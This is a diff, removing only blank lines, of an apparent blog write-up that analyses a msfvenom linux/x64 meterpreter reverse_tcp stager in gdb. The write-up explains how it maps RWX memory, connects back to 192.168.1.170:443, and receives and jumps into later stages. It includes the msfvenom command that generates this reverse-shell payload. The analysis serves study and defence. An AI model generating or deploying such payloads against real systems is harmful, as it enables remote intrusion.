@@ -52,7 +52,6 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.170 LPORT=443 -f e
 # Payload size: 130 bytes
 # Final size of elf file: 250 bytes
 # Saved as: shellcode
-
 ```
 
 As you may have noticed, I decided to use the format `elf` instead of `raw`.
@@ -66,7 +65,6 @@ The resulting binary is a 64-bit one, hence it will run on x86-64 systems only:
 ```bash
 file ./shellcode
 # ./shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
-
 ```
 
 Next, we can start the real analysis with `gdb`:
@@ -93,7 +91,6 @@ gdb -q ./shellcode
 #    0x0000000000400089:  pop    r10
 #    0x000000000040008b:  mov    dl,0x7
 #    0x000000000040008d:  syscall
-
 ```
 
 Judging by the output of the last command, the first instructions seem to be related to the syscall 9 (`sys_mmap`):
@@ -125,7 +122,6 @@ pop    r10
 ; store the value 0x1007 into DX
 mov    dl,0x7
 syscall
-
 ```
 
 These instructions invoke the syscall **sys_mmap** in order to map/unmap files or devices into memory. You can find more information following the link below:
@@ -143,7 +139,6 @@ void *mmap(
     int fd,
     off_t offset
 );
-
 ```
 
 <figcaption class="figure-caption">Function Prototype of `mmap`</figcaption>
@@ -159,7 +154,6 @@ mmap(
   ?,          // ignored, since we're using MAP_ANONYMOUS
   0           // MAP_ANONYMOUS requires this parameter to be 0
 );
-
 ```
 
 Overall, the call to `mmap` simply creates an anonymous mapping of **1000 **bytes and sets the permissions as `READ`, `WRITE`, and `EXECUTE`.
@@ -173,7 +167,6 @@ After that, we have the following instructions:
 # Dump of assembler code from 0x40008f to 0x4000a4:
 # => 0x000000000040008f:  test   rax,rax
 #    0x0000000000400092:  js     0x4000e5
-
 ```
 
 This one looks like a conditional statement.
@@ -193,7 +186,6 @@ If the call to mmap **failed**, then the shellcode jumps to the address `0x4000e
   #  0x4000e8:    push   0x1
   #  0x4000ea:    pop    rdi
   #  0x4000eb:    syscall
-
 ```
 
 The syscall identified by the hex number **0x3c **is `sys_exit`.
@@ -220,7 +212,6 @@ Back to the successful case, after the previous **jump signed** instruction (`js
 #    0x00000000004000a3:  syscall 
 #    0x00000000004000a5:  test   rax,rax
 #    0x00000000004000a8:  js     0x4000e5
-
 ```
 
 As usual, let's analyze them one by one:
@@ -254,7 +245,6 @@ syscall
 ; if sys_socket fails (returning -1) then jump to 0x4000e5 (sys_exit)
 test   rax,rax
 js     0x4000e5
-
 ```
 
 These instructions can be converted the following C code:
@@ -270,7 +260,6 @@ if (RAX < 0)
 {
   exit(1);
 }
-
 ```
 
 Once the shellcode has created the socket, the next operations should be connecting to the remote server:
@@ -287,7 +276,6 @@ Once the shellcode has created the socket, the next operations should be connect
 #    0x00000000004000bd:  push   0x2a
 #    0x00000000004000bf:  pop    rax
 #    0x00000000004000c0:  syscall
-
 ```
 
 Let's analyze these instructions:
@@ -320,7 +308,6 @@ pop    rax
 
 ; invoke sys_connect
 syscall
-
 ```
 
 They can be converted to the following C code:
@@ -333,7 +320,6 @@ myaddr.sin_port = htons(443);
 inet_aton("192.168.1.170", &amp;myaddr.sin_addr.s_addr);
 
 connect(RDI, (struct sockaddr*)RSI, 16);
-
 ```
 
 All it does is create a **sockaddr** structure that stores the IP address and the TCP port, along with address family (`AF_INET`, i.e. IPv4), and then pass this structure to the function `connect`.
@@ -358,7 +344,6 @@ After the call to `sys_connect`, the following instructions are run:
 #    0x00000000004000d5:  mov    rdi,rsp
 #    0x00000000004000d8:  xor    rsi,rsi
 #    0x00000000004000db:  syscall
-
 ```
 
 As usual, let's analyze them:
@@ -396,7 +381,6 @@ xor    rsi,rsi
 
 ; invoke sys_nanosleep
 syscall
-
 ```
 
 These instructions can be converted to the following C code:
@@ -417,7 +401,6 @@ t.tv_sec = 5;
 t.tv_nsec = 0;
 
 nanosleep(&amp;t, NULL);
-
 ```
 
 The shellcode sleeps for **5 seconds** if it doesn't succeed to connect to the remote socket.
@@ -437,7 +420,6 @@ After the call to `sys_nanosleep`, follows these instructions:
 #    0x00000000004000e8:  push   0x1
 #    0x00000000004000ea:  pop    rdi
 #    0x00000000004000eb:  syscall
-
 ```
 
 As you may notice, the shellcode uses the `POP` instruction 3 times:
@@ -460,7 +442,6 @@ time ./shellcode
 # user    0.00s
 # sys     0.00s
 # cpu     0%
-
 ```
 
 Anyway, let's go back to the address `0x4000c6`.
@@ -484,7 +465,6 @@ If the call to `connect` is successful, then the shellcode jumps to the address 
 #    0x0000000000400100:  add    BYTE PTR [rax],al
 #    0x0000000000400102:  add    BYTE PTR [rax],al
 #    0x0000000000400104:  add    BYTE PTR [rax],al
-
 ```
 
 Follows a short analysis:
@@ -506,7 +486,6 @@ js     0x4000e5
 
 ; jump the shellcode received through sys_read
 jmp    rsi
-
 ```
 
 We now know that the shellcode expects **126 **bytes of data from the meterpreter handler after the initial connection.
@@ -554,7 +533,6 @@ The instructions run after the syscall `recvfrom` are the following:
 #    0x7ffff7ff8072:      mov    rax,0x8d55
 #    0x7ffff7ff8079:      add    rsi,rax
 #    0x7ffff7ff807c:      jmp    rsi
-
 ```
 
 Below is the analysis of the first block.
@@ -583,7 +561,6 @@ mov    rax,0x9
 
 ; invoke sys_mmap
 syscall
-
 ```
 
 It can be converted to the following C code:
@@ -597,7 +574,6 @@ mmap(
   0,            // ignored, since we're using MAP_ANONYMOUS
   0             // MAP_ANONYMOUS requires this parameter to be 0
 );
-
 ```
 
 It seems the second stage allocates `some memory` in order to make room for the third stage.
@@ -627,7 +603,6 @@ mov    rax,0x2d
 
 ; invoke sys_recvfrom
 syscall
-
 ```
 
 As done previously, the shellcode uses the syscall `recvfrom` in order to read the next stage (in this case the third one) from the meterpreter handler.
@@ -669,7 +644,6 @@ push   rax
 mov    rax,0x8d55
 add    rsi,rax
 jmp    rsi
-
 ```
 
 This last block of instructions performs some preliminary operations, such as stack alignment, before jumping to the shellcode of the third stage.
